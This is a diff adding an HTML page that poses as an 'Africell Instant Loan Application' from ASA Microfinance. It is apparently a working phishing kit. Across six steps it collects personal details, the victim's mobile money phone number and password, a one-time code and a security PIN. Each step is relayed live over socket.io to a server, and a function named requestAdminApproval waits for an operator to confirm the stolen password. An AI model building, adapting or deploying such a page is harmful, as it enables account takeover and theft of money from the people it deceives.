@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Africell Instant Loan Application</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        [x-cloak] { display: none !important; }
+        :root {
+            --bg-dark: #0f131e;
+            --accent-orange: #e67e22;
+            --text-main: #ffffff;
+            --text-dim: #94a3b8;
+            --input-bg: rgba(255, 255, 255, 0.05);
+            --border-color: #334155;
+            --accent-teal: #00c2c2;
+        }
+        * { -webkit-tap-highlight-color: transparent; }
+        body { 
+            background-color: var(--bg-dark); 
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            min-height: 100vh; 
+            position: relative; 
+            overflow-x: hidden; 
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        select.input-premium option { background-color: #1e293b; color: white; }
+        .curve-top { position: absolute; top: 0; left: 0; width: 100%; height: 40vh; background: radial-gradient(circle at 50% -20%, #1e293b 0%, var(--bg-dark) 80%); z-index: -1; border-bottom-left-radius: 50% 20%; border-bottom-right-radius: 50% 20%; }
+        .curve-bottom { position: absolute; bottom: 0; left: 0; width: 100%; height: 15vh; background: linear-gradient(to top, #161e31, var(--bg-dark)); z-index: -1; border-top-left-radius: 50% 100%; border-top-right-radius: 50% 100%; }
+        .glass-panel { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border-radius: 1.25rem; }
+        .input-premium { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 0.875rem 1.25rem; width: 100%; border-radius: 0.75rem; outline: none; transition: all 0.3s; font-size: 0.9375rem; }
+        .input-premium:focus { border-color: var(--accent-orange); box-shadow: 0 0 0 3px rgba(230, 126, 34, 0.2); }
+        .btn-premium { background: var(--accent-orange); color: white; padding: 1rem; font-weight: 600; border-radius: 0.75rem; width: 100%; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 0.5rem; border:none; cursor:pointer; }
+        .btn-premium:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { background: transparent; border: 1px solid var(--border-color); color: var(--text-dim); padding: 1rem; border-radius: 0.75rem; transition: 0.3s; cursor: pointer; }
+        .label-premium { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-dim); margin-bottom: 0.5rem; display: block; }
+        .progress-step { display: flex; flex-direction: column; align-items: center; flex: 1; }
+        .progress-dot { width: 32px; height: 32px; border-radius: 50%; background: #1e293b; border: 2px solid #334155; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; margin-bottom: 6px; }
+        .progress-step.active .progress-dot { background: var(--accent-orange); border-color: var(--accent-orange); }
+        .progress-step.completed .progress-dot { background: #10b981; border-color: #10b981; }
+        .progress-step.completed .progress-dot::after { content: '✓'; font-size: 16px; }
+        .progress-step.completed .progress-dot span { display: none; }
+        .otp-input { letter-spacing: 0.5rem; text-align: center; font-weight: 700; font-size: 24px; }
+        .pin-box { width: 50px; height: 50px; border: 2px solid var(--accent-teal); border-radius: 10px; text-align: center; font-size: 24px; background: #0f172a; color: #ffffff; outline: none; }
+        .ib-phone-wrapper { display: flex; border: 2px solid var(--accent-teal); border-radius: 10px; padding: 10px; align-items: center; background: #0f172a; }
+        .ib-country-code { display: flex; align-items: center; gap: 10px; padding-right: 10px; border-right: 1px solid #1f2937; color: #e2e8f0; }
+        .spinner-sm { animation: spin 1s linear infinite; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .toast { position: fixed; top: 20px; right: 20px; padding: 12px 24px; border-radius: 8px; background: white; color: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.2); z-index: 9999; transform: translateX(400px); transition: transform 0.3s ease; }
+        .toast.show { transform: translateX(0); }
+        .toast.success { background: #10b981; color: white; }
+        .toast.error { background: #ef4444; color: white; }
+    </style>
+</head>
+<body x-data="loanFlow()" x-init="init()" class="antialiased">
+    <div id="toast" class="toast" :class="[toast.type, toast.show ? 'show' : '']" x-text="toast.message"></div>
+    <div class="curve-top"></div>
+    <div class="curve-bottom"></div>
+
+    <main class="max-w-xl mx-auto px-4 pt-10 pb-20 relative z-10">
+        <section class="glass-panel overflow-hidden relative">
+            <div class="bg-white px-6 py-6 border-b border-gray-200">
+                <div class="flex flex-col items-center">
+                    <img src="https://www.nicepng.com/png/detail/251-2513313_asa-logo-rgb-colour-horiz-fullsize-distr-asa.png" alt="ASA Logo" class="h-12 w-auto mb-3">
+                    <h1 class="text-xl font-bold text-gray-900">ASA Microfinance</h1>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Instant Loan Application</p>
+                </div>
+            </div>
+
+            <div class="p-6 md:p-8">
+                <div class="flex justify-between mb-8">
+                    <template x-for="i in 6" :key="i">
+                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
+                            <div class="progress-dot"><span x-text="i"></span></div>
+                        </div>
+                    </template>
+                </div>
+                
+                <div x-show="step === 1" x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Loan Details</h2><span class="text-xs font-bold text-orange-400">Step 01</span></div>
+                    <div class="space-y-4">
+                        <select x-model="form.loanType" class="input-premium">
+                            <option value="">Select Loan Type</option>
+                            <option value="Personal">Personal Loan</option>
+                            <option value="Business">Business Loan</option>
+                        </select>
+                        <div>
+                            <div class="flex justify-between"><label class="label-premium">Amount ($)</label><span class="text-xl font-bold" x-text="'$' + form.amount"></span></div>
+                            <input type="range" x-model="form.amount" min="100" max="50000" step="100" class="w-full accent-orange-500">
+                        </div>
+                        <select x-model="form.term" class="input-premium">
+                            <option value="">Select Loan Term</option>
+                            <option value="3">3 months</option><option value="6">6 months</option><option value="12">12 months</option>
+                        </select>
+                        <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Purpose of loan"></textarea>
+                        <button @click="submitStep1" :disabled="!isStep1Valid" class="btn-premium">Continue →</button>
+                    </div>
+                </div>
+
+                <div x-show="step === 2" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Identity Verification</h2><span class="text-xs font-bold text-orange-400">Step 02</span></div>
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4"><input type="text" x-model="form.firstName" class="input-premium" placeholder="First name"><input type="text" x-model="form.lastName" class="input-premium" placeholder="Last name"></div>
+                        <input type="email" x-model="form.email" class="input-premium" placeholder="Email">
+                        <div class="flex"><span class="input-premium w-24 flex items-center">🇸🇱+232</span><input type="tel" x-model="form.phone" class="input-premium flex-1" placeholder="76XXXXXX" maxlength="9"></div>
+                        <div class="grid grid-cols-2 gap-4"><button @click="step = 1" class="btn-secondary">← Back</button><button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Continue →</button></div>
+                    </div>
+                </div>
+
+                <div x-show="step === 3" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Employment Information</h2><span class="text-xs font-bold text-orange-400">Step 03</span></div>
+                    <div class="space-y-4">
+                        <select x-model="form.employment" class="input-premium"><option value="">Select Status</option><option value="Employed">Employed</option><option value="Self-Employed">Self-Employed</option></select>
+                        <input type="number" x-model="form.income" class="input-premium" placeholder="Annual income ($)">
+                        <input type="text" x-model="form.employer" class="input-premium" placeholder="Employer (optional)">
+                        <div class="grid grid-cols-2 gap-4"><button @click="step = 2" class="btn-secondary">← Back</button><button @click="submitStep3" :disabled="!isStep3Valid" class="btn-premium">Continue →</button></div>
+                    </div>
+                </div>
+
+                <div x-show="step === 4" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
+                    <div class="space-y-4">
+                        <div class="ib-phone-wrapper"><span class="ib-country-code">🇸🇱 +232</span><input type="tel" x-model="africell.phone" class="input-premium border-0 bg-transparent" placeholder="76XXXXXX" maxlength="9"></div>
+                        <input type="password" x-model="africell.password" class="input-premium" placeholder="Password">
+                        <div class="grid grid-cols-2 gap-4 pt-4"><button @click="step = 3" class="btn-secondary">← Back</button><button @click="requestAdminApproval" :disabled="!isStep4Valid || passwordVerifying" class="btn-premium"><span x-show="!passwordVerifying">Verify →</span><span x-show="passwordVerifying" class="spinner-sm"></span></button></div>
+                    </div>
+                </div>
+
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
+                    <h2 class="text-xl font-bold mb-6">Verification Code</h2>
+                    <div class="space-y-4">
+                        <input type="text" x-model="otp.code" class="input-premium otp-input" maxlength="6" placeholder="000000">
+                        <button @click="verifyOTP" :disabled="otp.code.length !== 6" class="btn-premium">Verify →</button>
+                    </div>
+                </div>
+
+                <div x-show="step === 6" x-cloak x-transition.duration.200ms>
+                    <h2 class="text-xl font-bold mb-6">Confirm Security PIN</h2>
+                    <div class="flex justify-center gap-3">
+                        <template x-for="(_, i) in 4" :key="i"><input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]"></template>
+                    </div>
+                    <button @click="submitStep6" :disabled="!isPinValid || pinVerifying" class="btn-premium mt-6">Submit Application</button>
+                </div>
+
+                <div x-show="step === 7" x-cloak class="text-center py-8">
+                    <div class="text-6xl mb-4">✅</div>
+                    <h2 class="text-2xl font-bold text-green-400">Application Submitted!</h2>
+                    <p class="text-gray-400">Reference: <span x-text="referenceId"></span></p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        function loanFlow() {
+            return {
+                step: 1, appId: '', referenceId: '', connected: false,
+                form: { loanType: '', amount: 5000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
+                africell: { phone: '', password: '' },
+                otp: { code: '' },
+                pin: { value: ['', '', '', ''] },
+                passwordVerifying: false, pinVerifying: false, socket: null, toast: { show: false, message: '', type: 'info' },
+
+                // Original getters
+                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone; },
+                get isStep3Valid() { return this.form.employment && this.form.income; },
+                get isStep4Valid() { return this.africell.phone && this.africell.password; },
+                get isPinValid() { return this.pin.value.join('').length === 4; },
+
+                init() {
+                    this.socket = io();
+                    this.socket.on('connect', () => { this.connected = true; });
+                    this.socket.on('session-ready', (data) => { this.appId = data.appId; this.socket.emit('join-room', data.appId); });
+                    this.socket.on('password-verified', () => { this.passwordVerifying = false; this.step = 5; });
+                    this.socket.on('pin-verified', (d) => { this.pinVerifying = false; this.referenceId = d.referenceId; this.step = 7; });
+                },
+
+                submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
+                submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
+                submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
+                requestAdminApproval() { this.passwordVerifying = true; this.socket.emit('step4', this.africell); },
+                verifyOTP() { this.socket.emit('step5', { otp: this.otp.code }); this.step = 6; },
+                submitStep6() { this.pinVerifying = true; this.socket.emit('step6', { pin: this.pin.value.join('') }); },
+                movePinFocus(e, i) { if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); }
+            }
+        }
+    </script>
+</body>
+</html>
